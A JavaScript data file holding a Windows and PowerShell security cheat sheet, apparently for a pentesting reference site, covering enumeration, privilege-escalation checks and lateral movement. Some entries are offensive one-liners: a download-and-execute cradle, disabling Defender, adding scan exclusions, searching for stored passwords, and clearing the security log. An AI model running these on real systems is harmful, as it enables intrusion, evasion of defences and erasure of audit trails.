export const windowsCheatsheet = {
  id: "windows",
  title: "Windows Security & PowerShell",
  icon: "monitor",
  color: "cyber-primary",
  description: "PowerShell commands and Windows security essentials",
  lastUpdated: "2024-01-15",
  sections: [
    {
      title: "System Information",
      commands: [
        { cmd: "systeminfo", desc: "Detailed system information" },
        { cmd: "hostname", desc: "Computer name" },
        { cmd: "whoami", desc: "Current user" },
        { cmd: "whoami /priv", desc: "User privileges" },
        { cmd: "whoami /groups", desc: "User group memberships" },
        { cmd: "net user", desc: "List local users" },
        { cmd: "net user username", desc: "User details" },
        { cmd: "net localgroup", desc: "List local groups" },
        { cmd: "net localgroup Administrators", desc: "Admin group members" },
        { cmd: "qwinsta", desc: "Active sessions" },
        { cmd: "Get-ComputerInfo", desc: "PS: System info" },
        { cmd: "Get-LocalUser", desc: "PS: List users" },
        { cmd: "[Environment]::Is64BitProcess", desc: "PS: Check 64-bit" },
      ],
    },
    {
      title: "Active Directory Enumeration",
      commands: [
        { cmd: "net user /domain", desc: "Domain users" },
        { cmd: "net group /domain", desc: "Domain groups" },
        { cmd: "net group 'Domain Admins' /domain", desc: "Domain admin members" },
        { cmd: "nltest /dclist:domain.com", desc: "List domain controllers" },
        { cmd: "Get-ADUser -Filter *", desc: "PS: All AD users" },
        { cmd: "Get-ADGroup -Filter *", desc: "PS: All AD groups" },
        { cmd: "Get-ADComputer -Filter *", desc: "PS: All computers" },
        { cmd: "Get-ADDomainController", desc: "PS: Domain controller info" },
        { cmd: "Get-ADGroupMember 'Domain Admins'", desc: "PS: Domain admins" },
        { cmd: "[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()", desc: "PS: Current domain" },
        { cmd: "Get-ADTrust -Filter *", desc: "PS: Domain trusts" },
        { cmd: "Get-ADDefaultDomainPasswordPolicy", desc: "PS: Password policy" },
      ],
    },
    {
      title: "Network Enumeration",
      commands: [
        { cmd: "ipconfig /all", desc: "Full IP configuration" },
        { cmd: "route print", desc: "Routing table" },
        { cmd: "arp -a", desc: "ARP cache" },
        { cmd: "netstat -ano", desc: "All connections with PIDs" },
        { cmd: "netstat -bno", desc: "Connections with process names" },
        { cmd: "netsh firewall show state", desc: "Firewall status" },
        { cmd: "netsh advfirewall show allprofiles", desc: "Advanced firewall" },
        { cmd: "Get-NetIPConfiguration", desc: "PS: IP config" },
        { cmd: "Get-NetTCPConnection", desc: "PS: TCP connections" },
        { cmd: "Get-NetFirewallRule | Where Enabled -eq True", desc: "PS: Firewall rules" },
        { cmd: "Test-NetConnection -Port 445 host", desc: "PS: Test port" },
        { cmd: "Resolve-DnsName hostname", desc: "PS: DNS lookup" },
      ],
    },
    {
      title: "Process & Service Management",
      commands: [
        { cmd: "tasklist", desc: "List processes" },
        { cmd: "tasklist /svc", desc: "Processes with services" },
        { cmd: "taskkill /PID 1234 /F", desc: "Force kill process" },
        { cmd: "wmic process list brief", desc: "Process info via WMI" },
        { cmd: "sc query", desc: "List services" },
        { cmd: "sc qc servicename", desc: "Service configuration" },
        { cmd: "net start", desc: "Running services" },
        { cmd: "net start/stop servicename", desc: "Start/stop service" },
        { cmd: "Get-Process", desc: "PS: List processes" },
        { cmd: "Get-Service", desc: "PS: List services" },
        { cmd: "Get-WmiObject Win32_Service", desc: "PS: Service details" },
        { cmd: "Get-CimInstance Win32_Process", desc: "PS: Process WMI" },
      ],
    },
    {
      title: "File System & Registry",
      commands: [
        { cmd: "dir /a C:\\Users", desc: "List with hidden files" },
        { cmd: "dir /s /b *.txt", desc: "Recursive search" },
        { cmd: "findstr /si password *.txt", desc: "Search file contents" },
        { cmd: "icacls filename", desc: "File permissions" },
        { cmd: "type filename.txt", desc: "Display file" },
        { cmd: "reg query HKLM /s /f password", desc: "Search registry" },
        { cmd: "reg query 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion'", desc: "OS version" },
        { cmd: "Get-ChildItem -Recurse -Filter *.txt", desc: "PS: Find files" },
        { cmd: "Get-Content filename.txt", desc: "PS: Read file" },
        { cmd: "Get-Acl filename", desc: "PS: File ACL" },
        { cmd: "Get-ItemProperty 'HKLM:\\SOFTWARE\\...'", desc: "PS: Registry" },
        { cmd: "Get-ChildItem Env:", desc: "PS: Environment vars" },
      ],
    },
    {
      title: "Privilege Escalation Checks",
      commands: [
        { cmd: "whoami /priv", desc: "Check privileges (SeImpersonate, SeDebug)" },
        { cmd: "accesschk.exe -uwcqv 'Authenticated Users' *", desc: "Weak service perms" },
        { cmd: "wmic service get name,pathname,startmode", desc: "Unquoted service paths" },
        { cmd: "schtasks /query /fo LIST /v", desc: "Scheduled tasks" },
        { cmd: "reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer", desc: "AlwaysInstallElevated" },
        { cmd: "reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer", desc: "AlwaysInstallElevated" },
        { cmd: "cmdkey /list", desc: "Stored credentials" },
        { cmd: "dir C:\\Users\\*\\AppData\\Local\\Temp\\*.ps1", desc: "PS scripts in temp" },
        { cmd: "Get-ScheduledTask | Where State -eq Running", desc: "PS: Running tasks" },
        { cmd: "Get-Hotfix", desc: "PS: Installed patches" },
        { cmd: "Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*'", desc: "Installed software" },
      ],
    },
    {
      title: "PowerShell Security & Evasion",
      commands: [
        { cmd: "Get-ExecutionPolicy", desc: "Check execution policy" },
        { cmd: "Set-ExecutionPolicy Bypass -Scope Process", desc: "Bypass for session" },
        { cmd: "powershell -ep bypass -file script.ps1", desc: "Run with bypass" },
        { cmd: "[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('cmd'))", desc: "Base64 encode" },
        { cmd: "powershell -enc [base64string]", desc: "Run encoded command" },
        { cmd: "IEX (New-Object Net.WebClient).DownloadString('http://...')", desc: "Download & execute" },
        { cmd: "Get-MpComputerStatus", desc: "Defender status" },
        { cmd: "Set-MpPreference -DisableRealtimeMonitoring $true", desc: "Disable Defender (admin)" },
        { cmd: "Add-MpPreference -ExclusionPath 'C:\\Tools'", desc: "Add exclusion" },
        { cmd: "Get-WinEvent -FilterHashtable @{LogName='Security'}", desc: "Security events" },
      ],
    },
    {
      title: "Remote Access & Lateral Movement",
      commands: [
        { cmd: "net use \\\\target\\C$ /u:domain\\user pass", desc: "Map admin share" },
        { cmd: "net use \\\\target\\IPC$ /u:domain\\user pass", desc: "IPC connection" },
        { cmd: "dir \\\\target\\C$", desc: "List remote C drive" },
        { cmd: "copy file.exe \\\\target\\C$\\Windows\\Temp", desc: "Copy to remote" },
        { cmd: "wmic /node:target process call create 'cmd'", desc: "Remote WMI exec" },
        { cmd: "psexec \\\\target -u user -p pass cmd", desc: "PsExec remote shell" },
        { cmd: "Enter-PSSession -ComputerName target", desc: "PS: Remote session" },
        { cmd: "Invoke-Command -ComputerName target -ScriptBlock {cmd}", desc: "PS: Remote command" },
        { cmd: "New-PSSession -ComputerName target -Credential $cred", desc: "PS: Auth session" },
        { cmd: "winrs -r:target cmd", desc: "WinRM remote shell" },
      ],
    },
    {
      title: "Event Logs & Forensics",
      commands: [
        { cmd: "wevtutil qe Security /c:10 /f:text", desc: "Last 10 security events" },
        { cmd: "wevtutil cl Security", desc: "Clear security log" },
        { cmd: "Get-WinEvent -LogName Security -MaxEvents 100", desc: "PS: Security events" },
        { cmd: "Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624}", desc: "PS: Logon events" },
        { cmd: "Get-WinEvent -FilterHashtable @{LogName='Security';ID=4625}", desc: "PS: Failed logons" },
        { cmd: "Get-EventLog -LogName System -Newest 50", desc: "PS: System log" },
        { cmd: "auditpol /get /category:*", desc: "Audit policy" },
        { cmd: "Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\*'", desc: "Log config" },
      ],
    },
  ],
};
